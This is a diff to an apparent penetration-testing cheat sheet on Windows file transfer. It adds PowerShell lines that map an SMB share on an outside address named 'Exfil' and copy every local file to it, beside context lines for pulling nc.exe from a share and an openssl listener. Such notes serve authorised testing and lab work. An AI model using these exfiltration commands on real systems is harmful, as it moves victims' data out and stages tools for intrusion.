@@ -70,6 +70,11 @@ $ openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < <file>
 > net use n: \\IP\shareName /user:test password
 > copy n:\nc.exe
 ```
+```Powershell
+PS C:\> New-PSDrive -Name "SHARE_NAME" -PsProvider "Filesystem" -Root "\\YOUR_IP\YOUR_SHARE_NAME"
+PS C:\> New-PSDrive -Name "Exfil" -PsProvider "Filesystem" -Root "\\10.10.14.195\share"
+PS C:\> copy * Exfil:\
+```
 ## Copy
 ```powershell
 > copy \\IP[:PORT]\shareName\nc.exe
